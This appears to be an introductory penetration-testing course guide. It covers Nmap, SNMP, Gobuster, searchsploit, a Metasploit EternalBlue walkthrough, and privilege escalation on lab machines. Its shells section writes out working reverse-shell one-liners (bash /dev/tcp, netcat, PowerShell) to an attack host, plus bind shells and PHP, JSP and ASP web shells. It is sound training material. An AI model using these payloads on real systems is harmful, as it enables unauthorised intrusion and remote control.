# Getting Started InfoSec

[Information security](https://en.wikipedia.org/wiki/Information\_security) (infosec) is a vast field. The field has grown and evolved greatly in the last few years. It offers many specializations, including but not limited to:

* Network and infrastructure security
* Application security
* Security testing
* Systems auditing
* Business continuity planning
* Digital forensics
* Incident detection and response

In a nutshell, infosec is the practice of protecting data from unauthorized access, changes, unlawful use, disruption, etc. Infosec professionals also take actions to reduce the overall impact of any such incident.



### Risk Management Process

Data protection must focus on efficient yet effective policy implementation without negatively affecting an organization's business operations and productivity. To achieve this, organizations must follow a process called the `risk management process`. This process involves the following five steps:

| Step                   | Explanation                                                                                                                                                                               |
| ---------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Identifying the Risk` | Identifying risks the business is exposed to, such as legal, environmental, market, regulatory, and other types of risks.                                                                 |
| `Analyze the Risk`     | Analyzing the risks to determine their impact and probability. The risks should be mapped to the organization's various policies, procedures, and business processes.                     |
| `Evaluate the Risk`    | Evaluating, ranking, and prioritizing risks. Then, the organization must decide to accept (unavoidable), avoid (change plans), control (mitigate), or transfer risk (insure).             |
| `Dealing with Risk`    | Eliminating or containing the risks as best as possible. This is handled by interfacing directly with the stakeholders for the system or process that the risk is associated with.        |
| `Monitoring Risk`      | All risks must be constantly monitored. Risks should be constantly monitored for any situational changes that could change their impact score, `i.e., from low to medium or high impact`. |

### Red Team vs. Blue Team

In infosec, we usually hear the terms `red team` and `blue team`. In the simplest terms, the `red team` plays the attackers' role, while the `blue team` plays the defenders' part.



### Setting Up a Pentest Distro

There are many ways to set up our local pentest distro. We can install it as our base operating system (though not recommended), configure our workstation to dual boot (time-consuming to switch back and forth between operating systems), or install using virtualization.

There are quite a few options available to us: [Hyper-V](https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/about/) on Windows, as virtual machines on [bare metal hypervisors](https://www.vmware.com/topics/glossary/content/bare-metal-hypervisor) such as [Proxmox](https://proxmox.com/en/) or [VMware ESXi](https://www.vmware.com/products/esxi-and-esx.html) or using free hypervisors such as [VirtualBox](https://www.virtualbox.org/), or [VMware Workstation Player](https://www.vmware.com/products/workstation-player.html), which can be installed and used as hypervisors on Windows and Linux operating systems.

A `hypervisor` is software that allows us to create and run virtual machines (VMs). It will enable us to use our host computer (desktop or laptop) to run multiple VMs by virtually sharing memory and processing resources.



### Folder Structure

When attacking a single box, lab, or client environment, we should have a clear folder structure on our attack machine to save data such as: scoping information, enumeration data, evidence of exploitation attempts, sensitive data such as credentials, and other data obtained during recon, exploitation, and post-exploitation. A sample folder structure may look like follows:

```shell-session
TomasFerreira@htb[/htb]$ tree Projects/

Projects/
└── Acme Company
    ├── EPT
    │   ├── evidence
    │   │   ├── credentials
    │   │   ├── data
    │   │   └── screenshots
    │   ├── logs
    │   ├── scans
    │   ├── scope
    │   └── tools
    └── IPT
        ├── evidence
        │   ├── credentials
        │   ├── data
        │   └── screenshots
        ├── logs
        ├── scans
        ├── scope
        └── tools
```

Here we have a folder for the client `Acme Company` with two assessments, Internal Penetration Test (IPT) and External Penetration Test (EPT). Under each folder, we have subfolders for saving scan data, any relevant tools, logging output, scoping information (i.e., lists of IPs/networks to feed to our scanning tools), and an evidence folder that may contain any credentials retrieved during the assessment, any relevant data retrieved as well as screenshots.



## Common Terms

### Shell

| **Shell Type**  | **Description**                                                                                                                                                                                                                                   |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Reverse shell` | Initiates a connection back to a "listener" on our attack box.                                                                                                                                                                                    |
| `Bind shell`    | "Binds" to a specific port on the target host and waits for a connection from our attack box.                                                                                                                                                     |
| `Web shell`     | Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a `PHP` script to run a single command. |

### Ports

As information security professionals, we must be able to quickly recall large amounts of information on a wide variety of topics. It is essential for us, especially as pentesters, to have a firm grasp of many `TCP` and `UDP` ports and be able to recognize them from just their number quickly (i.e., know that port `21` is `FTP`, port `80` is `HTTP`, port `88` is `Kerberos`) without having to look it up.

Guides such as [this](https://www.stationx.net/common-ports-cheat-sheet/) and [this](https://packetlife.net/media/library/23/common-ports.pdf) are great resources for learning standard and less common TCP and UDP ports.

&#x20;This is a great [reference](https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/) on the top 1,000 `TCP` and `UDP` ports from `nmap` along with the top 100 services scanned by `nmap`.



## Basic Tools

### SSH

[Secure Shell (SSH)](https://en.wikipedia.org/wiki/SSH\_\(Secure\_Shell\)) is a network protocol that runs on port `22` by default and provides users such as system administrators a secure way to access a computer remotely.

SSH can be configured with password authentication or passwordless using [public-key authentication](https://serverpilot.io/docs/how-to-use-ssh-public-key-authentication/) using an SSH public/private key pair.

```shell-session
TomasFerreira@htb[/htb]$ ssh Bob@10.10.10.10

Bob@remotehost's password: *********

Bob@remotehost#
```

### Netcat

[Netcat](https://linux.die.net/man/1/nc), `ncat`, or `nc`, is an excellent network utility for interacting with TCP/UDP ports.

Its primary usage is for connecting to shells.

In addition to that, `netcat` can be used to connect to any listening port and interact with the service running on that port.

&#x20;For example, `SSH` is programmed to handle connections over port 22 to send all data and keys. We can connect to TCP port 22 with `netcat`:

```shell-session
TomasFerreira@htb[/htb]$ netcat 10.10.10.10 22

SSH-2.0-OpenSSH_8.4p1 Debian-3
```

As we can see, port 22 sent us its banner, stating that `SSH` is running on it. This technique is called `Banner Grabbing`, and can help identify what service is running on a particular port.

### Tmux

Terminal multiplexers, like `tmux` or `Screen`, are great utilities for expanding a standard Linux terminal's features, like having multiple windows within one terminal and jumping between them.

The default key to input `tmux` commands prefix is `[CTRL + B]`. In order to open a new window in `tmux`, we can hit the prefix 'i.e. `[CTRL + B]`' and then hit `C`:

We see the numbered windows at the bottom. We can switch to each window by hitting the prefix and then inputting the window number, like `0` or `1`. We can also split a window vertically into panes by hitting the prefix and then `[SHIFT + %]`:

<figure><img src="../../.gitbook/assets/image (236).png" alt=""><figcaption></figcaption></figure>

We can also split into horizontal panes by hitting the prefix and then `[SHIFT + "]`:

We can switch between panes by hitting the prefix and then the `left` or `right` arrows for horizontal switching or the `up` or `down` arrows for vertical switching.

This [cheatsheet](https://tmuxcheatsheet.com/) is a very handy reference. Also, this [Introduction to tmux](https://www.youtube.com/watch?v=Lqehvpe\_djs) video by `ippsec` is worth your time.

### Vim

[Vim](https://linuxcommand.org/lc3\_man\_pages/vim1.html) is a great text editor that can be used for writing code or editing text files on Linux systems.

Let's see some of the basics of `Vim`. To open a file with `Vim`, we can add the file name after it:

```shell-session
TomasFerreira@htb[/htb]$ vim /etc/hosts
```

Once we open a file, we are in read-only `normal mode`, which allows us to navigate and read the file.

To edit the file, we hit `i` to enter `insert mode`, shown by the "`-- INSERT --`" at the bottom of `Vim`.

Once we are finished editing a file, we can hit the escape key `esc` to get out of `insert mode`, back into `normal mode`. When we are in `normal mode`, we can use the following keys to perform some useful shortcuts:

| Command | Description    |
| ------- | -------------- |
| `x`     | Cut character  |
| `dw`    | Cut word       |
| `dd`    | Cut full line  |
| `yw`    | Copy word      |
| `yy`    | Copy full line |
| `p`     | Paste          |

If we want to save a file or quit `Vim`, we have to press`:` to go into `command mode`.

| Command | Description          |
| ------- | -------------------- |
| `:1`    | Go to line number 1. |
| `:w`    | Write the file, save |
| `:q`    | Quit                 |
| `:q!`   | Quit without saving  |
| `:wq`   | Write and quit       |

This [cheatsheet](https://vimsheet.com/) is an excellent resource for further unlocking the power of `Vim`.



## Service Scanning

### Nmap

```shell-session
TomasFerreira@htb[/htb]$ nmap 10.129.42.253

Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:07 EST
Nmap scan report for 10.129.42.253
Host is up (0.11s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 2.19 seconds
```

Under the `PORT` heading, it also tells us that these are TCP ports. By default, `Nmap` will conduct a TCP scan unless specifically requested to perform a UDP scan.\
The `STATE` heading confirms that these ports are open. Sometimes we will see other ports listed that have a different state, such as `filtered`. This can happen if a firewall is only allowing access to the ports from specific addresses.\
The `SERVICE` heading tells us the service's name is typically mapped to the specific port number. However, the default scan will not tell us what is listening on that port. Until we instruct `Nmap` to interact with the service and attempt to tease out identifying information, it could be another service altogether.



We can use the `-sC` parameter to specify that `Nmap` scripts should be used to try and obtain more detailed information. The `-sV` parameter instructs `Nmap` to perform a version scan. In this scan, Nmap will fingerprint services on the target system and identify the service protocol, application name, and version.

Finally, `-p-` tells Nmap that we want to scan all 65,535 TCP ports.

```shell-session
TomasFerreira@htb[/htb]$ nmap -sV -sC -p- 10.129.42.253

### **Nmap Scripts**

Specifying `-sC` will run many useful default scripts against a target, but there are cases when running a specific script is required. For example, in an assessment scope, we may be asked to audit a large Citrix installation. We could use [this](https://raw.githubusercontent.com/cyberstruggle/DeltaGroup/master/CVE-2019-19781/CVE-2019-19781.nse) `Nmap` script to audit for the severe Citrix NetScaler vulnerability ([CVE-2019–19781](https://blog.rapid7.com/2020/01/17/active-exploitation-of-citrix-netscaler-cve-2019-19781-what-you-need-to-know/)), while `Nmap` also has other scripts to audit a Citrix installation.

```shell-session
TomasFerreira@htb[/htb]$ locate scripts/citrix

/usr/share/nmap/scripts/citrix-brute-xml.nse
/usr/share/nmap/scripts/citrix-enum-apps-xml.nse
/usr/share/nmap/scripts/citrix-enum-apps.nse
/usr/share/nmap/scripts/citrix-enum-servers-xml.nse
/usr/share/nmap/scripts/citrix-enum-servers.nse
```

The syntax for running an Nmap script is `nmap --script <script name> -p<port> <host>`.



### Attacking Network Services

**Banner Grabbing**

Nmap will attempt to grab the banners if the syntax `nmap -sV --script=banner <target>` is specified. We can also attempt this manually using `Netcat`.

```shell-session
TomasFerreira@htb[/htb]$ nc -nv 10.129.42.253 21

(UNKNOWN) [10.129.42.253] 21 (ftp) open
220 (vsFTPd 3.0.3)
```

This reveals that the version of `vsFTPd` on the server is `3.0.3`. We can also automate this process using `Nmap's` powerful scripting engine: `nmap -sV --script=banner -p21 10.10.10.0/24`.



**SNMP**

SNMP Community strings provide information and statistics about a router or device, helping us gain access to it.

```shell-session
TomasFerreira@htb[/htb]$ snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0

iso.3.6.1.2.1.1.5.0 = STRING: "gs-svcscan"
```

```shell-session
TomasFerreira@htb[/htb]$ snmpwalk -v 2c -c private  10.129.42.253 

Timeout: No Response from 10.129.42.253
```

A tool such as [onesixtyone](https://github.com/trailofbits/onesixtyone) can be used to brute force the community string names using a dictionary file of common community strings such as the `dict.txt` file included in the GitHub repo for the tool.

```shell-session
TomasFerreira@htb[/htb]$ onesixtyone -c dict.txt 10.129.42.254

Scanning 1 hosts, 51 communities
10.129.42.254 [public] Linux gs-svcscan 5.4.0-66-generic #74-Ubuntu SMP Wed Jan 27 22:54:38 UTC 2021 x86_64
```



## Web Enumeration

When performing service scanning, we will often run into web servers running on ports 80 and 443. Webservers host web applications (sometimes more than 1) which often provide a considerable attack surface and a very high-value target during a penetration test.



### Gobuster

After discovering a web application, it is always worth checking to see if we can uncover any hidden files or directories on the webserver that are not intended for public access. We can use a tool such as [ffuf](https://github.com/ffuf/ffuf) or [GoBuster](https://github.com/OJ/gobuster) to perform this directory enumeration.

**Directory/File Enumeration**

GoBuster is a versatile tool that allows for performing DNS, vhost, and directory brute-forcing.

For this module's purposes, we are interested in the directory (and file) brute-forcing modes specified with the switch `dir`. Let us run a simple scan using the `dirb` `common.txt` wordlist.

```shell-session
TomasFerreira@htb[/htb]$ gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt

===============================================================

/wordpress (Status: 301)
===============================================================
2020/12/11 21:47:46 Finished
===============================================================
```

The scan was completed successfully, and it identifies a WordPress installation at `/wordpress`. WordPress is the most commonly used CMS (Content Management System) and has an enormous potential attack surface.



**DNS Subdomain Enumeration**

There also may be essential resources hosted on subdomains, such as admin panels or applications with additional functionality that could be exploited. We can use `GoBuster` to enumerate available subdomains of a given domain using the `dns` flag to specify DNS mode.



**Install SecLists**

```shell-session
TomasFerreira@htb[/htb]$ git clone https://github.com/danielmiessler/SecLists
```

```shell-session
TomasFerreira@htb[/htb]$ sudo apt install seclists -y
```

Next, add a DNS Server such as 1.1.1.1 to the `/etc/resolv.conf` file. We will target the domain `inlanefreight.com`, the website for a fictional freight and logistics company.

```shell-session
TomasFerreira@htb[/htb]$ gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt

### Web Enumeration Tips

**Banner Grabbing / Web Server Headers**

Web server headers provide a good picture of what is hosted on a web server.

They can reveal the specific application framework in use, the authentication options, and whether the server is missing essential security options or has been misconfigured.

```shell-session
TomasFerreira@htb[/htb]$ curl -IL https://www.inlanefreight.com

HTTP/1.1 200 OK
Date: Fri, 18 Dec 2020 22:24:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Link: <https://www.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
Link: <https://www.inlanefreight.com/>; rel=shortlink
Content-Type: text/html; charset=UTF-8
```

Another handy tool is [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness), which can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.



**Whatweb**

We can extract the version of web servers, supporting frameworks, and applications using the command-line tool `whatweb`.

```shell-session
TomasFerreira@htb[/htb]$ whatweb 10.10.10.121

http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
```

`Whatweb` is a handy tool and contains much functionality to automate web application enumeration across a network.

```shell-session
TomasFerreira@htb[/htb]$ whatweb --no-errors 10.10.10.0/24

http://10.10.10.11 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.11], PoweredBy[Red,nginx], Title[Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux], nginx[1.14.1]
http://10.10.10.100 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.100], Title[File Sharing Service]
http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
http://10.10.10.247 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@cross-fit.htb], Frame, HTML5, HTTPServer[OpenBSD httpd], IP[10.10.10.247], JQuery[3.3.1], PHP[7.4.12], Script, Title[Fine Wines], X-Powered-By[PHP/7.4.12], X-UA-Compatible[ie=edge]
```



**Certificates**

SSL/TLS certificates are another potentially valuable source of information if HTTPS is in use.

&#x20;Browsing to `https://10.10.10.121/` and viewing the certificate reveals the details below:

<figure><img src="../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>

These could potentially be used to conduct a phishing attack if this is within the scope of an assessment.

\
**Robots.txt**

It is common for websites to contain a `robots.txt` file, whose purpose is to instruct search engine web crawlers such as Googlebot which resources can and cannot be accessed for indexing. The `robots.txt` file can provide valuable information such as the location of private files and admin pages.

In this case, we see that the `robots.txt` file contains two disallowed entries.

Navigating to `http://10.10.10.121/private` in a browser reveals a HTB admin login page.

**Source Code**

It is also worth checking the source code for any web pages we come across.

This example reveals a developer comment containing credentials for a test account, which could be used to log in to the website.

## Public Exploits

Once we identify the services running on ports identified from our `Nmap` scan, the first step is to look if any of the applications/services have any public exploits. Public exploits can be found for web applications and other applications running on open ports, like `SSH` or `ftp`.

### Finding Public Exploits

One way is to google the service name with "exploit", as the  following example shows:

<figure><img src="../../.gitbook/assets/image (240).png" alt=""><figcaption></figcaption></figure>

A well-known tool for this purpose is `searchsploit`, which we can use to search for public vulnerabilities/exploits for any application. We can install it with the following command:

&#x20;&#x20;

```shell-session
TomasFerreira@htb[/htb]$ sudo apt install exploitdb -y
```

```shell-session
TomasFerreira@htb[/htb]$ searchsploit openssh 7.2

----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

We can also utilize online exploit databases to search for vulnerabilities, like [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com/).



### Metasploit Primer

The Metasploit Framework (MSF) is an excellent tool for pentesters. It contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets. MSF has many other features, like:

* Running reconnaissance scripts to enumerate remote hosts and compromised targets
* Verification scripts to test the existence of a vulnerability without actually compromising the target
* Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets
* Many post-exploitation and pivoting tools

To run `Metasploit`, we can use the `msfconsole` command:

```shell-session
TomasFerreira@htb[/htb]$ msfconsole


      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.

                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.0.16-dev                          ]
+ -- --=[ 2074 exploits - 1124 auxiliary - 352 post       ]

+ -- --=[ 7 evasion                                       ]
```

Once we have `Metasploit` running, we can search for our target application with the `search exploit` command. For example, we can search for the SMB vulnerability we identified previously:

```shell-session
msf6 > search exploit eternalblue

Matching Modules

```

Tip: Search can apply complex filters such as search cve:2009 type:exploit. See all the filters with help search

We found one exploit for this service. We can use it by copying the full name of it and using `USE` to use it:

```shell-session
msf6 > use exploit/windows/smb/ms17_010_psexec

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Before we can run the exploit, we need to configure its options. To view the options available to configure, we can use the `show options` command:

```shell-session

...SNIP...
```

Any option with `Required` set to `yes` needs to be set for the exploit to work. In this case, we only have two options to set: `RHOSTS`, which means the IP of our target (this can be one IP, multiple IPs, or a file containing a list of IPs).

The second option, `LHOST`, represents the IP of our attack host (this can be a single IP, or the name of a network interface. In the example below, `LHOST` is being set to the IP associated with our `tun0` interface.) We can set them with the `set` command:

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```

Once we have both options set, we can start the exploitation. However, before we run the script, we can run a check to ensure the server is vulnerable:

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
```

As we can see, the server is indeed vulnerable. Note that not every exploit in the `Metasploit Framework` supports the `check` function. Finally, we can use the `run` or `exploit` command to run the exploit:

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444

As we can see, we have been able to gain admin access to the box and used the `shell` command to drop us into an interactive shell. These are basic examples of using `Metasploit` to exploit a vulnerability on a remote server. There are many retired boxes on the Hack The Box platform that are great for practicing Metasploit. Some of these include, but not limited to:

* Granny/Grandpa
* Jerry
* Blue
* Lame
* Optimum
* Legacy
* Devel



## Types of Shells

One way to connect to a compromised system is through network protocols, like `SSH` for Linux or `WinRM` for Windows, which would allow us a remote login to the compromised system. However, unless we obtain a working set of login credentials, we would not be able to utilize these methods without executing commands on the remote system first, to gain access to these services in the first place.

The other method of accessing a compromised host for control and remote code execution is through shells.\
As previously discussed, there are three main types of shells: Reverse Shell, Bind Shell, and Web Shell. Each of these shells has a different method of communication with us for accepting and executing our commands.

| Type of Shell   | Method of Communication                                                                                                     |
| --------------- | --------------------------------------------------------------------------------------------------------------------------- |
| `Reverse Shell` | Connects back to our system and gives us control through a reverse connection.                                              |
| `Bind Shell`    | Waits for us to connect to it and gives us control once we do.                                                              |
| `Web Shell`     | Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output. |



### Reverse Shell

A `Reverse Shell` is the most common type of shell, as it is the quickest and easiest method to obtain control over a compromised host. Once we identify a vulnerability on the remote host that allows remote code execution, we can start a `netcat` listener on our machine that listens on a specific port, say port `1234`. With this listener in place, we can execute a `reverse shell command` that connects the remote systems shell, i.e., `Bash` or `PowerShell` to our `netcat` listener, which gives us a reverse connection over the remote system.

### **Netcat Listener**

```shell-session
TomasFerreira@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
```

The flags we are using are the following:

| Flag      | Description                                                                         |
| --------- | ----------------------------------------------------------------------------------- |
| `-l`      | Listen mode, to wait for a connection to connect to us.                             |
| `-v`      | Verbose mode, so that we know when we receive a connection.                         |
| `-n`      | Disable DNS resolution and only connect from/to IPs, to speed up the connection.    |
| `-p 1234` | Port number `netcat` is listening on, and the reverse connection should be sent to. |

### **Connect Back IP**

Note: We are connecting to the IP in 'tun0' because we can only connect to HackTheBox boxes through the VPN connection, as they do not have internet connection, and therefore cannot connect to us over the internet using `eth0`. In a real pentest, you may be directly connected to the same network, or performing an external penetration test, so you may connect through the `eth0` adapter or similar.

### **Reverse Shell Command**

The command we execute depends on what operating system the compromised host runs on, i.e., Linux or Windows, and what applications and commands we can access. The [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) page has a comprehensive list of reverse shell commands we can use that cover a wide range of options depending on our compromised host.

The below commands are reliable commands we can use to get a reverse connection, for `bash` on Linux compromised hosts and `Powershell` on Windows compromised hosts:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

&#x20;Once we do, we should receive a connection in our `netcat` listener:

```shell-session
TomasFerreira@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, after we received a connection on our `netcat` listener, we were able to type our command and directly get its output back, right in our machine.



### Bind Shell

Another type of shell is a `Bind Shell`. Unlike a `Reverse Shell` that connects to us, we will have to connect to it on the `targets'` listening port.

Once we execute a `Bind Shell Command`, it will start listening on a port on the remote host and bind that host's shell, i.e., `Bash` or `PowerShell`, to that port. We have to connect to that port with `netcat`, and we will get control through a shell on that system.

Note: we will start a listening connection on port '1234' on the remote host, with IP '0.0.0.0' so that we can connect to it from anywhere.

The following are reliable commands we can use to start a bind shell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

We can use `netcat` to connect to that port and get a connection to the shell:

```shell-session
TomasFerreira@htb[/htb]$ nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Unlike a `Reverse Shell`, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.

\
**Upgrading TTY**

Once we connect to a shell through Netcat, we will notice that we can only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the command history. To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY.

There are multiple methods to do this. For our purposes, we will use the `python/stty` method. In our `netcat` shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:

```shell-session
TomasFerreira@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'
```

After we run this command, we will hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:

```shell-session
www-data@remotehost$ ^Z

TomasFerreira@htb[/htb]$ stty raw -echo
TomasFerreira@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
```

Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `enter` again to get back to our shell or input `reset` and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.

We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:

```shell-session
TomasFerreira@htb[/htb]$ echo $TERM

xterm-256color
```

```shell-session
TomasFerreira@htb[/htb]$ stty size

67 318
```

The first command showed us the `TERM` variable, and the second shows us the values for `rows` and `columns`, respectively. Now that we have our variables, we can go back to our `netcat` shell and use the following command to correct them:

```shell-session
www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```



## Web Shell

The final type of shell we have is a `Web Shell`. A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our command through HTTP request parameters such as `GET` or `POST` request parameters, executes our command, and prints its output back on the web page.



### W**riting a Web Shell**

First of all, we need to write our web shell that would take our command through a `GET` request, execute it, and print its output back.

The following are some common short web shell scripts for common web languages:

```php
<?php system($_REQUEST["cmd"]); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```



## **Uploading a Web Shell**

Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser.

This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. `shell.php` and upload it, and then access our uploaded file to execute commands.

However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:

| Web Server | Default Webroot        |
| ---------- | ---------------------- |
| `Apache`   | /var/www/html/         |
| `Nginx`    | /usr/local/nginx/html/ |
| `IIS`      | c:\inetpub\wwwroot\\   |
| `XAMPP`    | C:\xampp\htdocs\\      |

We can check these directories to see which webroot is in use and then use `echo` to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a `PHP` shell with the following command:

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

## **Accessing Web Shell**

Once we write our web shell, we can either access it through a browser or by using `cURL`. We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:

<figure><img src="../../.gitbook/assets/image (241).png" alt=""><figcaption></figcaption></figure>

Another option is to use `cURL`:

<figure><img src="../../.gitbook/assets/image (242).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### PrivEsc Checklists

Once we gain initial access to a box, we want to thoroughly enumerate the box to find any potential vulnerabilities we can exploit to achieve a higher privilege level.

One excellent resource is [HackTricks](https://book.hacktricks.xyz/), which has an excellent checklist for both [Linux](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) and [Windows](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) local privilege escalation.

Another excellent repository is [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), which also has checklists for both [Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) and [Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md).



### Enumeration Scripts

Many of the above commands may be automatically run with a script to go through the report and look for any weaknesses.

Some of the common Linux enumeration scripts include [LinEnum](https://github.com/rebootuser/LinEnum.git) and [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker), and for Windows include [Seatbelt](https://github.com/GhostPack/Seatbelt) and [JAWS](https://github.com/411Hall/JAWS).

Another useful tool we may use for server enumeration is the [Privilege Escalation Awesome Scripts SUITE (PEASS)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.

